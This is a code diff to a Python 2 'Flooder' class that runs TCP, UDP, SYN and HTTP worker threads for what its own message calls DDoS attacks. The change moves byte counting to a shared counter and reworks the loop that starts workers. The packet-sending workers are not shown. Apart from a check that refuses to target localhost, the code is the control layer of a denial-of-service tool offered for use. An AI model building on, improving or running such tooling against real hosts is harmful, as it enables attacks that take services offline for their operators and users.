@@ -1,4 +1,4 @@
-from multiprocessing import Queue
+from multiprocessing import Queue, Value
 from Events import *
 from Globals import *
 from UDPWorkerThread import *
@@ -21,10 +21,11 @@ class Flooder:
         self.message = message
         self.random = random
         self.threadId = 0
-        self.byteCount = Queue.Queue()
         self.srchost = srchost
         self.srcport = srcport
         self.initsuccess = True
+
+        self.byteCount = Value('i', 0)
 
         if host == "127.0.0.1" or host == "localhost":
             print "Is someone being funny again? I'm not going to DDoS myself"
@@ -66,7 +67,8 @@ class Flooder:
         if len(self.__processes) > 0 or not self.initsuccess:
             return
 
-        for x in range(self.threadsAmount):
+        x = 0
+        while len(self.__processes) < self.threadsAmount:
             p = None
             if self.method[x%len(self.method)] == TCP_METHOD:
 	            p = TCPWorkerThread(self, self.threadId)
@@ -76,6 +78,12 @@ class Flooder:
 	            p = SYNWorkerThread(self, self.threadId)
             elif self.method[x%len(self.method)] == HTTP_METHOD:
 	            p = HTTPWorkerThread(self, self.threadId)
+
+            x += 1
+
+            if not p.running:
+                continue
+
             self.threadId += 1
             self.__processes.append(p)
             p.start()
@@ -86,16 +94,8 @@ class Flooder:
             p.stop()
             p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.
 
-        byteCount = 0
-        #print "len:", self.byteCount.qsize()
-        while 1:
-            try:
-                b = self.byteCount.get(True, 2)
-                byteCount += b
-                #print "b:", b
-            except:
-                #print "failed to get"
-                break
+        print "final byteCount:", self.byteCount.value
 
-        print "final byteCount:", byteCount
+    def processNumber(self):
+        return len(self.__processes)
 
